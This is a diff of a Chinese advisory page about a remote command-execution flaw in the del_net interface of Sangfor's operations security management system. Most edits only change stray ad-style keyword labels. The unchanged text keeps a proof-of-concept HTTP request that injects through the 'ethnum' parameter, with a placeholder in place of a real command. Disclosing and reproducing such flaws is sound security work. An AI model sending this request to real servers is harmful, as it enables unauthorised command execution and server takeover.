@@ -8,7 +8,7 @@ asset_dir: embedded-base64
 
 深信服运维安全管理系统 del\_net 接口存在远程[命令执行](https://mrxn.net/tag/rce)漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。影响范围包括所有运行存在该漏洞版本的深信服运维安全管理系统的服务器。
 
-Windows安全工具
+计算机安全
 
 # 影响版本
 
@@ -28,11 +28,11 @@ Windows安全工具
 
 深入探索
 
-计算机安全
+软件
 
-漏洞利用分析
+数据管理
 
-安全研究工具
+商务软件和生产力软件
 
 # 漏洞复现
 
@@ -41,8 +41,6 @@ Windows安全工具
 ## POC
 
 > 多个参数均存在命令注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，这里以ethnum为例
->
-> 漏洞扫描服务
 
 ```
 POST /fort/system;help/netConfig/del_net HTTP/1.1
@@ -51,14 +49,6 @@ Content-Type: application/x-www-form-urlencoded
 
 ethnum=RCE_POC&IPV=255.255.255.1
 ```
-
-深入探索
-
-授权
-
-脚本语言
-
-安全研究报告
 
 访问命令执行结果文件
 
